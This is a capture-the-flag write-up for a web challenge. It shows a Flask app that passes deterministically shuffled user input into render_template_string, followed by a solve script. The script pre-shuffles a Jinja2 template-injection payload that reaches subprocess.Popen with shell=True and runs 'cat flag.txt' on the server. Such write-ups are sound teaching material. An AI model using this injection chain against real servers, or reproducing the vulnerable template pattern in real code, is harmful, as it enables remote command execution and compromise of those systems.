
Challenge: [https://winds.web.actf.co/](https://winds.web.actf.co/)

[app.py](https://files.actf.co/6926a43a62f8a6a915be5504473d0e051973f945213a9cf45d3fe00b366c8e7c/app.py)

```python
import random

from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

@app.get('/')
def root():
    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{{ error }}</div>
        </div>
    ''', error=request.args.get('error', ''))

@app.post('/shout')
def shout():
    text = request.form.get('text', '')
    if not text:
        return redirect('/?error=No message provided...')

    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    jumbled = ''.join(jumbled)

    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{{ error }}</div>
            <div>
                Your voice echoes back: %s
            </div>
        </div>
    ''' % jumbled, error=request.args.get('error', ''))

@app.get('/style.css')
def style():
    return '''
        html, body { margin: 0 }
        .content {
            padding: 2rem;
            width: 90%;
            max-width: 900px;
            margin: auto;
            font-family: Helvetica, sans-serif;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
    '''

```

## Solve

```python
import random
import requests
import html

payload = "{{ ''.__class__.__mro__[1].__subclasses__()[-1](request.args.cmd, shell=True, stdout=-1).communicate()[0].strip() }}"

shuffled = [i for i in range(len(payload))]
random.seed(0)
random.shuffle(shuffled)

ordered = [i for i in range(len(payload))]
for i, j in enumerate(shuffled):
    ordered[j] = payload[i]

payload = "".join(ordered)


headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}
response = requests.post("https://winds.web.actf.co/shout?cmd=cat flag.txt", data=f"text={payload}", headers=headers)
print(html.unescape(response.text))
```